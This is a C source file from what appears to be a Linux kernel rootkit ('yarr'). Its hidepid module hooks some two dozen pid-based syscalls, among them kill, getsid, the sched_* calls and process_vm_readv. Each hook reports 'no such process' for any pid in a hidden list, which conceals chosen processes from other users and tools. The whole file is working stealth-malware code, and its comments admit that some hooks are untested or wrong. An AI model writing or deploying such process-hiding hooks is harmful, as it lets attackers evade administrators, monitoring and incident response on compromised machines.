#include <linux/slab.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/sched/task.h>

#include "hidepid.h"
#include "list.h"
#include "log.h"
#include "hook.h"

// TODO: Using a List_t just to store pid_t types means a lot of overhead
// but as a first approach is ok.
List_t *__hidden_pid_list = NULL;
unsigned long *__sct = NULL;

// We depend on hook subsystem to have this information.
//extern unsigned long *__sct;

// TODO: Document functions.

static inline int __hidepid_initialized(void) {
    return (__hidden_pid_list == NULL)? 0: 0x01ec0ded;
}

/**
 * Checks whether or not a pid corresponds to the current process running. This
 * function was motivated because a lot of yarrcalls receiving a pid as an
 * arguments have to check whether or not that pid is in the list of hidden
 * pids.
 *
 * @pid: The pid to check if belongs to the current process.
 * @return: Non-zero if pid is the pid of the current process OR if pid is
 * zero, zero elsewhere.
 */
static inline int __pid_is_self(pid_t pid) {
    return (current->pid == pid || pid == 0)? 0x01ec0ded: 0;
}

/**
 * Checks if a pid is already hidden.
 *
 * @pid: The pid to check if it is in the list of hidden pids.
 * @return: Zero if pid is not hidden, non-zero if pid is hidden.
 */
static inline int __pid_is_hidden(pid_t pid) {
    if (!__hidepid_initialized()) {
        return 0;
    }

    return List_itemIsContained(__hidden_pid_list, &pid);
}

static void __print_pid(pid_t *param) {
    if (param == NULL) {
        yarr_log("param is NULL");
        return;
    }

    yarr_log("pid: %d", *param);
    return;
}

// TODO: We are returning -1 on errors, -1 also means p1 < p2.
static int __cmp_pid(pid_t *p1, pid_t *p2) {
    if (p1 == NULL || p2 == NULL) {
        yarr_log("p1 or p2 are NULL");
        return -1;
    }

    if (*p1 < *p2) {
        return -1;
    } else if (*p1 > *p2) {
        return 1;
    } else {
        return 0;
    }
}

// We need such function as we allocate memory for pid_t for each element in
// the list.
static void __pid_t_free(pid_t *pid_ptr) {
    if (pid_ptr != NULL) {
        kfree(pid_ptr);
    }

    return;
}

/* This is the list of syscalls that have the type pid_t among their arguments:
 * setpgid
 * getpgid
 * getsid
 * prlimit64
 * kill
 * tgkill
 * tkill
 * rt_sigqueueinfo
 * rt_tgsigqueueinfo
 * waitid
 * wait4
 * kcmp
 * sched_setscheduler
 * sched_setparam
 * sched_setattr
 * sched_getscheduler
 * sched_getparam
 * sched_getattr
 * sched_setaffinity
 * sched_getaffinity
 * sched_rr_get_interval
 * process_vm_readv
 * process_vm_writev
 * move_pages
 * migrate_pages
 *
 * We need to hook all of them to check if the pid passed is a hidden pid, in
 * that case we return -ESRCH as if a process with such a pid doesn't exist.
 */

// TODO: Couple of things. I haven't tested all these functions and probably
// will never do so expect problems. Also we can see a pattern in these
// functions, it'd be great to create a macro that generates all the common
// part, something similar to SYSCALL_DEFINEx() in the kernel.
asmlinkage long __yarr__x64_sys_setpgid(const struct pt_regs *regs) {
    long (*__x64_sys_setpgid)(const struct pt_regs *);
    pid_t pid;
    pid_t pgid;
//    struct pid *gl_pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    pgid = regs->si;

    // Tasks inside the hidden group can operate normally. Tasks outside don't
    // see the group.
    if (current->tgid != pgid && __pid_is_hidden(pgid)) {
        return -ESRCH;
    }

    __x64_sys_setpgid = __CAST_TO_SYSCALL(__sct[__NR_setpgid]);
    return __x64_sys_setpgid(regs);
}

asmlinkage long __yarr__x64_sys_getpgid(const struct pt_regs *regs) {
    long (*__x64_sys_getpgid)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_getpgid = __CAST_TO_SYSCALL(__sct[__NR_getpgid]);
    return __x64_sys_getpgid(regs);
}

asmlinkage long __yarr__x64_sys_getsid(const struct pt_regs *regs) {
    long (*__x64_sys_getsid)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_getsid = __CAST_TO_SYSCALL(__sct[__NR_getsid]);
    return __x64_sys_getsid(regs);
}

asmlinkage long __yarr__x64_sys_prlimit64(const struct pt_regs *regs) {
    long (*__x64_sys_prlimit64)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_prlimit64 = __CAST_TO_SYSCALL(__sct[__NR_prlimit64]);
    return __x64_sys_prlimit64(regs);
}

asmlinkage long __yarr__x64_sys_kill(const struct pt_regs *regs) {
    long (*__x64_sys_kill)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_kill = __CAST_TO_SYSCALL(__sct[__NR_kill]);
    return __x64_sys_kill(regs);
}

// Manuals are a good starting point to understand a function/feature, but as
// usual they are not THE TRUTH. In this case, man tgkill is not fully updated
// and some things differ from the real implementation. Always read the manual,
// but also look into the code a bit to confirm how accurate the manual is.
asmlinkage long __yarr__x64_sys_tgkill(const struct pt_regs *regs) {
    long (*__x64_sys_tgkill)(const struct pt_regs *);
    pid_t tid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    // TODO: Decision-making time: Shall I hide just a thread or a whole
    // process group (i.e. the whole process)? For now the thread.
    tid = regs->si;
    if (!__pid_is_self(tid) && __pid_is_hidden(tid)) {
        return -ESRCH;
    }

    __x64_sys_tgkill = __CAST_TO_SYSCALL(__sct[__NR_tgkill]);
    return __x64_sys_tgkill(regs);
}

asmlinkage long __yarr__x64_sys_tkill(const struct pt_regs *regs) {
    long (*__x64_sys_tkill)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(regs->di)) {
        return -ESRCH;
    }

    __x64_sys_tkill = __CAST_TO_SYSCALL(__sct[__NR_kill]);
    return __x64_sys_tkill(regs);
}

asmlinkage long __yarr__x64_sys_rt_sigqueueinfo(const struct pt_regs *regs) {
    long (*__x64_sys_rt_sigqueueinfo)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->si;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_rt_sigqueueinfo = __CAST_TO_SYSCALL(__sct[__NR_rt_sigqueueinfo]);
    return __x64_sys_rt_sigqueueinfo(regs);
}

asmlinkage long __yarr__x64_sys_rt_tgsigqueueinfo(const struct pt_regs *regs) {
    long (*__x64_sys_rt_tgsigqueueinfo)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_rt_tgsigqueueinfo = __CAST_TO_SYSCALL(__sct[__NR_rt_tgsigqueueinfo]);
    return __x64_sys_rt_tgsigqueueinfo(regs);
}

asmlinkage long __yarr__x64_sys_waitid(const struct pt_regs *regs) {
    long (*__x64_sys_waitid)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    // TODO: Not correct.
    pid = regs->si;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_waitid = __CAST_TO_SYSCALL(__sct[__NR_waitid]);
    return __x64_sys_waitid(regs);
}

asmlinkage long __yarr__x64_sys_wait4(const struct pt_regs *regs) {
    long (*__x64_sys_wait4)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_wait4 = __CAST_TO_SYSCALL(__sct[__NR_wait4]);
    return __x64_sys_wait4(regs);
}

asmlinkage long __yarr__x64_sys_kcmp(const struct pt_regs *regs) {
    long (*__x64_sys_kcmp)(const struct pt_regs *);
    pid_t pid1, pid2;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid1 = regs->di;
    pid2 = regs->si;
    if ( (!__pid_is_self(pid1) && !__pid_is_self(pid2))
            && (__pid_is_hidden(pid1) || __pid_is_hidden(pid2)) ) {
        return -ESRCH;
    }

    __x64_sys_kcmp = __CAST_TO_SYSCALL(__sct[__NR_kcmp]);
    return __x64_sys_kcmp(regs);
}

asmlinkage long __yarr__x64_sys_sched_setscheduler(const struct pt_regs *regs) {
    long (*__x64_sys_sched_setscheduler)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_sched_setscheduler = __CAST_TO_SYSCALL(__sct[__NR_sched_setscheduler]);
    return __x64_sys_sched_setscheduler(regs);
}

asmlinkage long __yarr__x64_sys_sched_setparam(const struct pt_regs *regs) {
    long (*__x64_sys_sched_setparam)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_sched_setparam = __CAST_TO_SYSCALL(__sct[__NR_sched_setparam]);
    return __x64_sys_sched_setparam(regs);
}

asmlinkage long __yarr__x64_sys_sched_setattr(const struct pt_regs *regs) {
    long (*__x64_sys_sched_setattr)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_sched_setattr = __CAST_TO_SYSCALL(__sct[__NR_sched_setattr]);
    return __x64_sys_sched_setattr(regs);
}

asmlinkage long __yarr__x64_sys_sched_getscheduler(const struct pt_regs *regs) {
    long (*__x64_sys_sched_getscheduler)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_sched_getscheduler = __CAST_TO_SYSCALL(__sct[__NR_sched_getscheduler]);
    return __x64_sys_sched_getscheduler(regs);
}

asmlinkage long __yarr__x64_sys_sched_getparam(const struct pt_regs *regs) {
    long (*__x64_sys_sched_getparam)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_sched_getparam = __CAST_TO_SYSCALL(__sct[__NR_sched_getparam]);
    return __x64_sys_sched_getparam(regs);
}

asmlinkage long __yarr__x64_sys_sched_getattr(const struct pt_regs *regs) {
    long (*__x64_sys_sched_getattr)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_sched_getattr = __CAST_TO_SYSCALL(__sct[__NR_sched_getattr]);
    return __x64_sys_sched_getattr(regs);
}

asmlinkage long __yarr__x64_sys_sched_setaffinity(const struct pt_regs *regs) {
    long (*__x64_sys_sched_setaffinity)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_sched_setaffinity = __CAST_TO_SYSCALL(__sct[__NR_sched_setaffinity]);
    return __x64_sys_sched_setaffinity(regs);
}

asmlinkage long __yarr__x64_sys_sched_getaffinity(const struct pt_regs *regs) {
    long (*__x64_sys_sched_getaffinity)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_sched_getaffinity = __CAST_TO_SYSCALL(__sct[__NR_sched_getaffinity]);
    return __x64_sys_sched_getaffinity(regs);
}

asmlinkage long __yarr__x64_sys_sched_rr_get_interval(const struct pt_regs *regs) {
    long (*__x64_sys_sched_rr_get_interval)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_sched_rr_get_interval = __CAST_TO_SYSCALL(__sct[__NR_sched_rr_get_interval]);
    return __x64_sys_sched_rr_get_interval(regs);
}

asmlinkage long __yarr__x64_sys_process_vm_readv(const struct pt_regs *regs) {
    long (*__x64_sys_process_vm_readv)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_process_vm_readv = __CAST_TO_SYSCALL(__sct[__NR_process_vm_readv]);
    return __x64_sys_process_vm_readv(regs);
}

asmlinkage long __yarr__x64_sys_process_vm_writev(const struct pt_regs *regs) {
    long (*__x64_sys_process_vm_writev)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_process_vm_writev = __CAST_TO_SYSCALL(__sct[__NR_process_vm_writev]);
    return __x64_sys_process_vm_writev(regs);
}

asmlinkage long __yarr__x64_sys_move_pages(const struct pt_regs *regs) {
    long (*__x64_sys_move_pages)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (current->pid == pid && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_move_pages = __CAST_TO_SYSCALL(__sct[__NR_move_pages]);
    return __x64_sys_move_pages(regs);
}

asmlinkage long __yarr__x64_sys_migrate_pages(const struct pt_regs *regs) {
    long (*__x64_sys_migrate_pages)(const struct pt_regs *);
    pid_t pid;

    if (regs == NULL) {
        yarr_log("regs are NULL");
        return -1;
    }

    pid = regs->di;
    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
        return -ESRCH;
    }

    __x64_sys_migrate_pages = __CAST_TO_SYSCALL(__sct[__NR_migrate_pages]);
    return __x64_sys_migrate_pages(regs);
}

/*****************************************************************************/

int hidepid_init(void) {
    if (__hidepid_initialized()) {
        yarr_log("Double initialization detected");
        return 0;
    }

    __hidden_pid_list = List_create(
            (void *)__print_pid,
            (void *)__cmp_pid,
            (void *)__pid_t_free);
    if (__hidden_pid_list == NULL) {
        yarr_log("Couldn't create __hidden_pid_list");
        return -1;
    }

    __sct = get_original_syscall_table64();
    if (__sct == NULL) {
        yarr_log("__sct is NULL, hook subsystem initialized?");
        return -1;
    }

    return 0;
}

int hidepid_finish(void) {
    if (!__hidepid_initialized()) {
        return 0;
    }

    List_destroy(__hidden_pid_list);
    __hidden_pid_list = NULL;
    __sct = NULL;

    return 0;
}

int hidepid_install_hooks(void) {
    int err = 0;
    
    err = install_hook(__NR_setpgid, __yarr__x64_sys_setpgid);
    err |= install_hook(__NR_getpgid, __yarr__x64_sys_getpgid);
    err |= install_hook(__NR_getsid, __yarr__x64_sys_getsid);
    err |= install_hook(__NR_prlimit64, __yarr__x64_sys_prlimit64);
    err |= install_hook(__NR_kill, __yarr__x64_sys_kill);
    err |= install_hook(__NR_tgkill, __yarr__x64_sys_tgkill);
    err |= install_hook(__NR_tkill, __yarr__x64_sys_tkill);
    err |= install_hook(__NR_rt_sigqueueinfo, __yarr__x64_sys_rt_sigqueueinfo);
    err |= install_hook(__NR_rt_tgsigqueueinfo, __yarr__x64_sys_rt_tgsigqueueinfo);
    err |= install_hook(__NR_waitid, __yarr__x64_sys_waitid);
    err |= install_hook(__NR_wait4, __yarr__x64_sys_wait4);
    err |= install_hook(__NR_kcmp, __yarr__x64_sys_kcmp);
    err |= install_hook(__NR_sched_setscheduler, __yarr__x64_sys_sched_setscheduler);
    err |= install_hook(__NR_sched_setparam, __yarr__x64_sys_sched_setparam);
    err |= install_hook(__NR_sched_setattr, __yarr__x64_sys_sched_setattr);
    err |= install_hook(__NR_sched_getscheduler, __yarr__x64_sys_sched_getscheduler);
    err |= install_hook(__NR_sched_getparam, __yarr__x64_sys_sched_getparam);
    err |= install_hook(__NR_sched_getattr, __yarr__x64_sys_sched_getattr);
    err |= install_hook(__NR_sched_setaffinity, __yarr__x64_sys_sched_setaffinity);
    err |= install_hook(__NR_sched_getaffinity, __yarr__x64_sys_sched_getaffinity);
    err |= install_hook(__NR_sched_rr_get_interval, __yarr__x64_sys_sched_rr_get_interval);
    err |= install_hook(__NR_process_vm_readv, __yarr__x64_sys_process_vm_readv);
    err |= install_hook(__NR_process_vm_writev, __yarr__x64_sys_process_vm_writev);
    err |= install_hook(__NR_move_pages, __yarr__x64_sys_move_pages);
    err |= install_hook(__NR_migrate_pages, __yarr__x64_sys_migrate_pages);

    return err;
}

int hide_pid(pid_t pid) {
    pid_t *pid_data;
    int err;

    if (!__hidepid_initialized()) {
        yarr_log("Hidepid subsystem not initialized");
        return -1;
    }

    if (__pid_is_hidden(pid)) {
        return 0;
    }

    pid_data = kmalloc(sizeof(pid_t), GFP_KERNEL);
    if (pid_data == NULL) {
        yarr_log("Couldn't allocate memory for pid");
        return -1;
    }

    *pid_data = pid;
    err = List_insertData(__hidden_pid_list, pid_data);
    if (err) {
        yarr_log("Error inserting pid in the list of hidden pids");
        kfree(pid_data);
        return -1;
    }

    return 0;
}

int unhide_pid(pid_t pid) {
    ListItem_t *item;
    int err;

    if (!__hidepid_initialized()) {
        yarr_log("Hidepid subsystem not initialize");
        return -1;
    }

    item = List_getItemByData(__hidden_pid_list, &pid);
    if (item != NULL) {
        err = List_removeItem(__hidden_pid_list, item);
        if (err) {
            yarr_log("Pid present but List_removeItem() returned error");
            return -1;
        }

        ListItem_destroy(item, __hidden_pid_list->free_data);
    }

    return 0;
}

